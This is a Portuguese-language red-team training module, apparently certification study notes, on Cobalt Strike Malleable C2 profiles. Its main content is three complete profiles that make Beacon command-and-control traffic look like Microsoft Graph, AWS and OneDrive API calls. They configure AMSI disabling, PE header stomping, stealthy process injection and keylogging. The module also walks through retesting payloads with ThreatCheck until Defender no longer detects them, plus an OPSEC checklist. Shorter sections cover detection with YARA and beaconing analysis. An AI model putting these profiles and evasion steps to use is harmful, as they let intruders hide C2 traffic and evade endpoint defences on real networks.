---
title: "Malleable C2 Profiles"
---

# Malleable C2 Profiles

## O Que Separa Operador Médio de Profissional

Malleable C2 é o que separa operador médio de operador profissional. Beacon padrão do Cobalt Strike, sem profile customizado, cai em qualquer EDR e ferramenta de análise de tráfego em segundos. Com profile bem elaborado, o mesmo Beacon trafega por redes corporativas se passando por requisições legítimas de Office 365, OneDrive ou qualquer SaaS cloud.

A função do Malleable C2 vai além de evasão de AV. Cobre cinco frentes: evasão de IDS/IPS (tráfego parece legítimo), evasão de análise de rede (proxies corporativos com SSL inspection não identificam o C2), evasão de análise de memória (controle de como o Beacon se comporta em RAM), confusão de atribuição (dificulta investigação forense), e consistência OPSEC (garante que todos os operadores sigam a mesma configuração). Pra CRTO I/II você precisa ler, entender e criar profiles básicos; pra OSEP, as opções de memória (`process-inject`, `post-ex`, `stage`) são fundamentais pra bypass de EDR.

---

## Anatomia de um Profile

### Anatomia de um Malleable C2 Profile

Um profile é um arquivo texto com extensão `.profile` que o Team Server lê na inicialização. A linguagem é declarativa com blocos aninhados:

```
# Estrutura geral de um profile

# ============================================================
# OPÇÕES GLOBAIS (fora de qualquer bloco)
# ============================================================
set sleeptime "60000";          # 60 segundos em ms
set jitter    "20";             # 20% de variação aleatória
set maxdns    "255";            # Máx bytes por query DNS
set useragent "Mozilla/5.0..."; # User-Agent global

# ============================================================
# BLOCO http-get - como o Beacon "faz check-in" (GET de tarefas)
# ============================================================
http-get {
    set uri "/api/v1/data";     # URI customizado
    
    client {
        # O que o Beacon envia no GET request
        header "Accept" "text/html,application/xhtml+xml";
        header "Accept-Language" "en-US,en;q=0.9";
        
        metadata {
            # Como os metadados do Beacon são transmitidos
            base64url;            # Encoding
            prepend "session=";   # Prefixo antes do valor
            header "Cookie";      # Onde colocar (Cookie header)
        }
    }
    
    server {
        # O que o servidor responde com as tarefas
        header "Content-Type" "application/json";
        header "X-Powered-By" "Express";
        
        output {
            # Como as tarefas são encodadas na resposta
            base64;
            print;
        }
    }
}

# ============================================================
# BLOCO http-post - como o Beacon envia resultados (POST)
# ============================================================
http-post {
    set uri "/api/v1/submit";
    
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        
        id {
            # ID do Beacon (como é transmitido)
            prepend "id=";
            parameter "id";
        }
        
        output {
            # Resultados das tarefas
            base64url;
            parameter "data";
        }
    }
    
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}

# ============================================================
# BLOCO stage - comportamento ao carregar o Beacon em memória
# ============================================================
stage {
    set allocator     "HeapAlloc";  # Como alocar memória
    set userwx        "false";      # Não usar RWX
    set stomppe       "true";       # Stompear PE header
    set cleanup       "true";       # Limpar artefatos
    set obfuscate     "true";       # Ofuscar string table
    
    # Transformações no Beacon antes de carregar
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90";  # NOP sled
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90";
    }
}

# ============================================================
# BLOCO post-ex - comportamento pós-exploração
# ============================================================
post-ex {
    set spawnto_x86  "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64  "%windir%\\system32\\dllhost.exe";
    set obfuscate    "true";
    set smartinject  "true";
    set amsi_disable "true";   # Desabilitar AMSI
    set keylogger    "GetAsyncKeyState";
}

# ============================================================
# BLOCO process-inject - como injetar em processos
# ============================================================
process-inject {
    set allocator    "NtMapViewOfSection";  # Técnica de alocação
    set min_alloc    "16384";               # Mínimo de memória
    set userwx       "false";
    
    transform-x86 {
        prepend "\x90\x90";
    }
    
    transform-x64 {
        prepend "\x90\x90";
    }
    
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart";
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

# ============================================================
# BLOCO http-stager - apenas se usar staged payloads
# ============================================================
http-stager {
    uri_x86 "/jquery-3.3.1.slim.min.js";
    uri_x64 "/jquery-3.3.2.slim.min.js";
    
    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation */";
            append "//@ sourceMappingURL=jquery.min.map";
            print;
        }
    }
}

# ============================================================
# BLOCO dns-beacon - configurações para DNS listener
# ============================================================
dns-beacon {
    set dns_idle      "8.8.8.8";
    set dns_sleep     "0";
    set dns_ttl       "1";
    set maxdns        "255";
    set dns_stager_prepend ".resources.";
    set dns_stager_subhost ".feeds.";
    set beacon        ".updates.";
    set get_A         ".version.";
    set get_AAAA      ".redir.";
    set get_TXT       ".patch.";
    set put_metadata  ".push.";
    set put_output    ".send.";
}
```

### Transformações de Dados

As transformações controlam como dados são encodados/decodados:

```
# Operações disponíveis (ordem importa!):
# Encoding:
base64          # Base64 padrão
base64url       # Base64 URL-safe (sem +/=)
mask            # XOR com chave aleatória
netbios         # NetBIOS encoding
netbiosu        # NetBIOS uppercase

# Manipulação:
append "VALOR"      # Adicionar ao final
prepend "VALOR"     # Adicionar ao início
print               # Usar como está (output final)

# Localização:
header "Nome"       # Colocar em header HTTP
parameter "nome"    # Colocar em query parameter
uri-append          # Adicionar na URI
```

**Exemplo de pipeline de transformação:**
```
# Dado original: abc123 (metadados do Beacon)
# Transformação:
metadata {
    netbiosu;           # → FCHMDEJJ (NetBIOS uppercase)
    prepend "user=";    # → user=FCHMDEJJ
    append "&ver=1";    # → user=FCHMDEJJ&ver=1
    uri-append;         # Coloca na URI: GET /api?user=FCHMDEJJ&ver=1
}
```

---

## Na Prática

### Profile Completo: Imitando Office 365 / Microsoft Graph API

```
# microsoft-graph.profile
# Imita tráfego da Microsoft Graph API

# Opções globais
set sleeptime "45000";   # 45 segundos
set jitter    "15";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61";

http-get {
    # URI que imita Microsoft Graph API endpoint
    set uri "/v1.0/me/messages /v1.0/me/contacts /v1.0/users";
    
    client {
        header "Host"              "graph.microsoft.com";
        header "Accept"            "application/json";
        header "Accept-Language"   "en-US";
        header "Accept-Encoding"   "gzip, deflate, br";
        header "Connection"        "keep-alive";
        
        metadata {
            # Metadados como Bearer token (base64url imita JWT parcialmente)
            base64url;
            prepend "Bearer ";
            header "Authorization";
        }
    }
    
    server {
        header "Content-Type"  "application/json; odata.metadata=minimal";
        header "request-id"    "7f6be2b6-8e37-4d36-b43f-e2bac7db0a3f";
        header "OData-Version" "4.0";
        header "Vary"          "Accept-Encoding";
        
        output {
            # Resposta parece JSON de lista de emails
            prepend "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#users('user@domain.com')/messages\",\"value\":[{\"id\":\"";
            append "\",\"subject\":\"Meeting notes\"}]}";
            print;
        }
    }
}

http-post {
    set uri "/v1.0/me/sendMail /v1.0/me/messages";
    
    client {
        header "Content-Type"    "application/json";
        header "Host"            "graph.microsoft.com";
        header "Accept"          "application/json";
        header "Accept-Encoding" "gzip, deflate, br";
        
        id {
            prepend "client_id=";
            append "&session=";
            parameter "client_id";
        }
        
        output {
            base64url;
            prepend "{\"message\":{\"subject\":\"Update\",\"body\":{\"contentType\":\"Text\",\"content\":\"";
            append "\"}}}";
            print;
        }
    }
    
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}

# Staging que imita download de JS da Microsoft
http-stager {
    uri_x86 "/assets/oneauth-2.0.27.js";
    uri_x64 "/assets/oneauth-2.1.0.js";
    
    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "max-age=2592000";
        output {
            prepend "!function(e,t){\"use strict\";";
            append "}(window,document)";
            print;
        }
    }
}

# Comportamento em memória - importante para bypass de EDR
stage {
    # Não usar RWX memory (detectável)
    set userwx        "false";
    
    # Destruir PE header após carregamento (dificulta análise de memória)
    set stomppe       "true";
    
    # Limpar indicadores de staging
    set cleanup       "true";
    
    # Ofuscar string table do Beacon
    set obfuscate     "true";
    
    # Usar HeapAlloc ao invés de VirtualAlloc (menos suspeito)
    set allocator     "HeapAlloc";
    
    # Módulo para mascarar Beacon como módulo legítimo
    # (module stomping - avançado)
    # set module_x64 "xpsservices.dll";
    
    transform-x64 {
        # NOP sled antes do PE header
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90";
    }
}

# Processo filho para operações pós-exploração
post-ex {
    # Em vez de rundll32.exe (muito detectado), usar processo legítimo
    set spawnto_x86  "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64  "%windir%\\system32\\dllhost.exe";
    
    # Ofuscar operações pós-exploração
    set obfuscate    "true";
    
    # Smart Inject: injetar Beacon em processo com mesmo arq
    set smartinject  "true";
    
    # Desabilitar AMSI para execute-assembly
    set amsi_disable "true";
    
    set keylogger    "GetAsyncKeyState";
}

# Configurações de injeção em processo
process-inject {
    # NtMapViewOfSection é menos detectado que VirtualAllocEx
    set allocator   "NtMapViewOfSection";
    set min_alloc   "16384";
    
    # Sem memória RWX
    set userwx      "false";
    
    transform-x64 {
        prepend "\x90\x90\x90\x90";
    }
    
    # Métodos de execução, tentados em ordem
    execute {
        # Thread remota como ntdll!RtlUserThreadStart (mais stealth)
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
        # APC síncrona
        NtQueueApcThread-s;
        # Thread remota clássica (mais detectável, fallback)
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
```

### Profile para Imitar Amazon AWS API

```
# amazon-aws.profile
# Imita tráfego de chamadas de API AWS

set sleeptime "60000";
set jitter    "30";
set useragent "aws-sdk-go/1.44.298 (go1.19.13; linux; amd64)";

http-get {
    set uri "/2015-03-31/functions /2016-11-15/describe-instances";
    
    client {
        header "Host"             "lambda.us-east-1.amazonaws.com";
        header "Accept"           "application/json";
        header "X-Amz-Date"       "20231015T120000Z";
        
        metadata {
            base64url;
            prepend "AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20231015/us-east-1/lambda/aws4_request, SignedHeaders=host;x-amz-date, Signature=";
            header "Authorization";
        }
    }
    
    server {
        header "Content-Type"     "application/json";
        header "x-amzn-requestid" "a1b2c3d4-e5f6-7890-a1b2-c3d4e5f67890";
        header "x-amz-id-2"       "Y6AAAAAAAAAAAAA=";
        
        output {
            prepend "{\"Functions\":[{\"FunctionName\":\"my-function\",\"Runtime\":\"nodejs18.x\",\"Role\":\"";
            append "\"}]}";
            print;
        }
    }
}

http-post {
    set uri "/2015-03-31/functions/my-function/invocations";
    
    client {
        header "Content-Type"  "application/json";
        header "X-Amz-Date"    "20231015T120000Z";
        
        id {
            prepend "\"RequestId\":\"";
            append "\"";
            parameter "RequestId";
        }
        
        output {
            base64url;
            prepend "{\"Event\":{\"source\":\"aws.events\",\"data\":\"";
            append "\"}}";
            print;
        }
    }
    
    server {
        header "Content-Type"         "application/json";
        header "X-Amz-Function-Error" "Unhandled";
        output {
            print;
        }
    }
}

stage {
    set stomppe   "true";
    set userwx    "false";
    set cleanup   "true";
    set obfuscate "true";
    set allocator "HeapAlloc";
}

post-ex {
    set spawnto_x64  "%windir%\\system32\\dllhost.exe";
    set amsi_disable "true";
    set obfuscate    "true";
}
```

### Profile para Imitar OneDrive

```
# onedrive.profile
# Imita tráfego de sincronização do OneDrive

set sleeptime "30000";
set jitter    "25";
set useragent "Microsoft SkyDriveSync 23.150.0724.0002 ship; Windows NT 10.0 (19045)";

http-get {
    set uri "/_api/v2.0/drives /api/v2.0/me/drive/root/children";
    
    client {
        header "Host"           "onedrive.live.com";
        header "Accept"         "application/json";
        header "Accept-Encoding" "gzip, deflate";
        
        metadata {
            base64url;
            prepend "t=";
            parameter "token";
        }
    }
    
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-RequestId"  "b1c2d3e4-f5a6-7890-b1c2-d3e4f5a67890";
        
        output {
            prepend "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#drives\",\"value\":[{\"driveType\":\"personal\",\"quota\":{\"remaining\":";
            append ",\"total\":1099511627776}}]}";
            print;
        }
    }
}

http-post {
    set uri "/_api/v2.0/drives/me/root/uploadSession";
    
    client {
        header "Content-Type" "application/octet-stream";
        header "Content-Range" "bytes 0-1023/4096";
        
        id {
            prepend "session=";
            header "X-DriveSession";
        }
        
        output {
            mask;
            base64url;
            print;
        }
    }
    
    server {
        header "Content-Type" "application/json";
        output {
            prepend "{\"expirationDateTime\":\"2023-12-31T23:59:59Z\",\"nextExpectedRanges\":[\"";
            append "\"]}";
            print;
        }
    }
}

stage {
    set userwx    "false";
    set stomppe   "true";
    set cleanup   "true";
    set obfuscate "true";
    set allocator "HeapAlloc";
}

post-ex {
    set spawnto_x64  "%windir%\\system32\\dllhost.exe";
    set amsi_disable "true";
}
```

---

## Exemplos de Código / Comandos

### Validando um Profile com c2lint

```bash
# c2lint valida a sintaxe e lógica do profile
# Incluído na instalação do Cobalt Strike

cd /opt/cobaltstrike
./c2lint profiles/microsoft-graph.profile

# Saída esperada (sem erros):
# ============================================================
# profile: microsoft-graph.profile
# ============================================================
# http-get
#   uri: /v1.0/me/messages
#   [client]
#     Authorization: Bearer <base64url encoded metadata>
#     ...
#   [server]
#     Content-Type: application/json...
#   OK
# http-post
#   OK
# stage
#   OK
# ============================================================
# PASS: microsoft-graph.profile
# ============================================================

# Se houver erro:
# [error] Line 42: 'set xxx "yyy"' - unknown option
```

### ThreatCheck com Profile Customizado

```bash
# ThreatCheck verifica quais bytes estão sendo detectados

# 1. Gerar payload com profile customizado e listener HTTPS
# (No CS Client: Attacks > Packages > Windows Executable Stageless)
# Salvar como: beacon-custom.exe

# 2. Testar contra Defender
.\ThreatCheck.exe -f beacon-custom.exe -e Defender

# Saída se detectado:
# [*] Target file size: 278524 bytes
# [*] Analyzing with Windows Defender...
# [!] Identified end of bad bytes at offset 0x3F200
# 00000000  FC 48 83 E4 F0 E8 CC 00  00 00 41 51 41 50 52 51  |.H........AQAPRQ|

# 3. Se detectado, identificar qual seção está sendo flagged
# Modificar o Artifact Kit na região identificada
# Recompilar e testar novamente

# 4. Testar script PS1 contra AMSI
.\ThreatCheck.exe -f script.ps1 -e AMSI

# Loop até passar:
# [+] No threat found!
```

### Comparando Perfis com Wireshark / Zeek

```bash
# VERIFICAR SE O TRÁFEGO PARECE LEGÍTIMO

# Capturar tráfego do Beacon com profile
tcpdump -i eth0 -w beacon-traffic.pcap host C2_IP

# Analisar com tshark
tshark -r beacon-traffic.pcap -Y "http" -T fields \
  -e http.host \
  -e http.request.uri \
  -e http.user_agent \
  -e http.request.method \
  -e http.authorization

# Verificar com Zeek (produz logs no formato de rede empresarial)
zeek -r beacon-traffic.pcap

# Analisar log HTTP do Zeek
cat http.log | zeek-cut host uri user_agent method

# Espera-se ver:
# graph.microsoft.com  /v1.0/me/messages  Mozilla/5.0...  GET
# graph.microsoft.com  /v1.0/me/sendMail  Mozilla/5.0...  POST

# Comparar com tráfego legítimo do Graph API para verificar
# se os campos são consistentes
```

### Detectar Beacon com Mal-configured Profile

```bash
# YARA rule para detectar Cobalt Strike com perfil padrão
# (Sem customização)

# Salvar como default-cs-detect.yar:
cat > /tmp/default-cs-detect.yar << 'EOF'
rule CobaltStrike_DefaultProfile {
    meta:
        description = "Detecta Cobalt Strike com perfil padrão"
        author = "RedTeam Study"
    
    strings:
        // URI padrão do Cobalt Strike sem customização
        $uri1 = "/submit.php" ascii
        $uri2 = "/pixel.gif" ascii
        $uri3 = "/j.ad" ascii
        
        // User-Agent com número aleatório (padrão CS)
        $ua = /Mozilla\/5\.0 \(compatible; MSIE 9\.0; Windows NT 6\.1; Trident\/5\.0; [0-9]+\)/ ascii
        
        // Resposta padrão do stage
        $magic = { FC 48 83 E4 F0 E8 }  // Prólogo típico do shellcode Beacon
        
        // Strings em memória do Beacon não-ofuscado
        $str1 = "ReflectiveLoader" ascii
        $str2 = "beacon.dll" ascii
        
    condition:
        (1 of ($uri*)) or $ua or (2 of ($str*)) or $magic
}
EOF

# Rodar YARA contra captura de tráfego ou arquivo
yara /tmp/default-cs-detect.yar beacon.exe
yara /tmp/default-cs-detect.yar beacon-traffic.pcap

# YARA rule para perfil customizado mas ainda detectável:
cat > /tmp/cs-memory-detect.yar << 'EOF'
rule CobaltStrike_Beacon_Memory {
    meta:
        description = "Detecta Beacon CS em memória por padrões estruturais"
    
    strings:
        // Configuração do Beacon em memória
        $config_x64 = { 00 01 00 01 00 02 [4] 00 02 [4] 00 ?? }
        
        // Exports conhecidos do Beacon DLL
        $exp1 = "ReflectiveLoader" ascii
        $exp2 = "DllMain" ascii
        
    condition:
        ($config_x64 at 0) or (all of ($exp*))
}
EOF
```

### Bypass de Assinatura YARA via Profile

```bash
# TÉCNICA: Stomping do PE Header

# O PE header do Beacon contém strings identificáveis
# Com stomppe "true" no stage block, o header é sobrescrito
# após carregamento em memória

# Verificar se stomping está funcionando com pe-sieve:
pe-sieve64.exe /pid <PID_do_processo_injetado>

# Se stompping OK:
# [*] Module /path/to/process.exe 
# [*] No modified/suspicious section found

# Se stompping NÃO está funcionando:
# [!] Replaced PE header found in module

# TÉCNICA: Obfuscate String Table
# Com set obfuscate "true", strings como "beacon.dll",
# "ReflectiveLoader" são removidas/ofuscadas
# Quebrando muitas regras YARA baseadas em strings

# TÉCNICA: Module Stomping (avançado)
# Em vez de alocar nova memória, o Beacon sobrescreve
# um módulo legítimo já carregado

# No stage block:
# set module_x64 "xpsservices.dll";
# O Beacon carrega xpsservices.dll e sobrescreve com seu código
# Para o sistema parece que é xpsservices.dll legítimo
```

### Configurações de process-inject para Bypass de EDR

```
# As técnicas de injeção em processo são verificadas por EDRs
# via hooks em ntdll.dll

process-inject {
    # OPÇÃO 1: NtMapViewOfSection
    # Mais stealth - mapeia seção de memória ao invés de VirtualAllocEx
    # Dificulta detecção porque não há WriteProcessMemory
    set allocator "NtMapViewOfSection";
    
    # OPÇÃO 2: VirtualAllocEx (padrão, mais detectável)
    # set allocator "VirtualAllocEx";
    
    # Tamanho mínimo de alocação
    set min_alloc "16384";
    
    # Sem RWX (usando RW depois VirtualProtect para RX)
    set userwx "false";
    
    transform-x64 {
        # Adicionar instruções antes do shellcode
        # Dificulta detecção por hash do código
        prepend "\x90\x90\x90\x90";  # NOP
        # ou padding com bytes aleatórios
    }
    
    execute {
        # Métodos de execução em ordem de preferência
        
        # CreateThread em ntdll - menos suspeito que CreateRemoteThread
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
        
        # APC síncrona - executada imediatamente, não precisa de alertable wait
        NtQueueApcThread-s;
        
        # APC assíncrona
        NtQueueApcThread;
        
        # Thread remotA - clássico mas detectado
        CreateRemoteThread;
        
        # Fallback final
        RtlCreateUserThread;
    }
}
```

---

## Detecção e OPSEC

### Como Defenders Detectam Malleable C2

**Análise de Tráfego de Rede:**
```
1. Beaconing Analysis:
   - Mesmo profile customizado gera intervalos regulares
   - Jitter reduz mas não elimina o padrão
   - Análise de frequência com ML detecta padrões
   
   Detecção em Zeek:
   SELECT * FROM http_logs 
   WHERE host = "graph.microsoft.com" 
   GROUP BY src_ip, FLOOR(ts/60) 
   HAVING COUNT(*) > 2 AND STDDEV(ts) < 5;
   -- Requests muito regulares para o mesmo host = suspeito

2. Domain/Certificate Analysis:
   - Domínio registrado recentemente (< 30 dias)
   - Certificado não corresponde ao host esperado
   - ASN do servidor não é da Microsoft/Amazon
   
3. JA3/JA3S Fingerprinting:
   - Fingerprint TLS do Beacon é consistente
   - Mesmo JA3 para todos os Beacons com mesmo profile
   - Bases de dados de JA3 conhecidos para CS
   
4. Content Analysis:
   - JSON responses do "Microsoft Graph" com estrutura inválida
   - Headers HTTP ausentes que seriam mandatórios
   - Response body não corresponde ao que o endpoint real retorna
```

**Análise de Memória / EDR:**
```
5. Memory Scanning:
   - Scan de memória em processo que não deveria ter código JIT
   - Encontrar o config do Beacon mesmo com ofuscação
   - Sleep masking não implementado = config visível
   
6. API Hooking:
   - EDRs hookam VirtualAlloc, CreateRemoteThread, etc.
   - Técnicas de unhooking detectáveis (ler ntdll de disco)
   - ETW (Event Tracing for Windows) captura chamadas suspeitas
   
7. Behavioral Detection:
   - dllhost.exe fazendo network connections
   - Processo sem GUI fazendo DNS queries
   - Processo herdado de processo incomum
```

### Verificar Profile com c2lint

```bash
# WORKFLOW COMPLETO DE VALIDAÇÃO

# 1. Validar sintaxe
./c2lint meu-profile.profile

# 2. Verificar que o tráfego parece correto
# Iniciar Team Server com o perfil
./teamserver 10.10.10.1 senha meu-profile.profile

# 3. Criar listener e gerar payload de teste
# 4. Executar payload em VM isolada com Wireshark rodando
# 5. Capturar e analisar tráfego

# 6. Simular análise do defender:
# Usar curl para simular o que um proxy veria:
curl -v -A "Mozilla/5.0..." http://C2/v1.0/me/messages

# 7. Verificar com ThreatCheck
.\ThreatCheck.exe -f payload.exe -e Defender

# 8. Verificar em memória após execução com pe-sieve
.\pe-sieve64.exe /pid <PID>

# 9. Se tudo passar, o profile está pronto para uso
```

### Boas Práticas OPSEC para Profiles

```bash
# CHECKLIST DE OPSEC PARA MALLEABLE C2

# [ ] Validar com c2lint antes de usar
# [ ] Testar tráfego com Wireshark/Zeek parece legítimo
# [ ] Verificar se domínio/ASN do redirector é consistente
#     com o que o profile imita
#     (Não usar profile da Microsoft com IP da DigitalOcean diretamente)
#     Usar domain fronting ou CDN da Microsoft
# [ ] sleeptime adequado para o ambiente (3600000 para beacons de longa duração)
# [ ] jitter >= 20% para quebrar padrão de beaconing
# [ ] set userwx "false" - nunca usar memória RWX
# [ ] set stomppe "true" - destruir PE header
# [ ] set obfuscate "true" - ofuscar string table
# [ ] spawnto configurado para processo que faz sentido
#     (dllhost.exe é bom; notepad.exe fazendo network requests é suspeito)
# [ ] amsi_disable "true" para execute-assembly
# [ ] Testar com ThreatCheck e garantir que não é detectado
# [ ] Não reutilizar o mesmo profile entre engajamentos
# [ ] Não usar profiles públicos do GitHub sem modificação
#     (têm assinaturas conhecidas)
# [ ] Documentar o profile usado para relatório final
```

### Stager Size vs Stageless com Profiles

```
STAGED com Malleable C2:
- Stager HTTP request expõe o C2 independente do profile
- Durante staging, os dados não seguem o profile totalmente
- O stage em si (Beacon) é transmitido "cru" e pode ser capturado
- TTP detectável: request de ~208KB de um binário pequeno

STAGELESS com Malleable C2:
- Todo o Beacon já está no payload
- Check-ins seguem 100% o perfil desde o início
- Sem exposição adicional do C2 durante staging
- Payload maior mas mais seguro operacionalmente

RECOMENDAÇÃO:
- Usar stageless para todos os payloads quando possível
- Staged apenas em casos específicos (overflow, macro Office com limitação)
- Se staged for necessário, usar HTTPS e garantir que o URI do stager
  está bem configurado no http-stager block
```

---

## Módulos Relacionados

`01_cobalt_strike_fundamentos.md` mostra como o Beacon se comunica (modelo pull-based) — base pra entender o profile. `02_listeners_e_payloads.md` cobre os tipos de listener que o profile configura. `04_infraestrutura_resiliente_redirectors.md` complementa com domain fronting (CDN real da Microsoft pra disfarçar tráfego). MITRE ATT&CK: T1071.001 (Web Protocols), T1001.003 (Protocol Impersonation), T1027 (Obfuscated Files), T1055 (Process Injection), T1140 (Deobfuscate).

---

## Leitura Complementar

- rsmudge/Malleable-C2-Profiles — https://github.com/rsmudge/Malleable-C2-Profiles
- threatexpress/malleable-c2 (profiles emulando APTs) — https://github.com/threatexpress/malleable-c2
- mgeeky/cobaltstrike-phishing-malleable-c2-profile
- FortyNorthSecurity — "Malleable C2 Profiles for Endpoint Evasion"
- Cobalt Strike blog — "Red Team Tactics: User-Defined Reflective Loader"
- Ferramentas: c2lint (incluído no CS), ThreatCheck, pe-sieve, 1768.py (Didier Stevens)
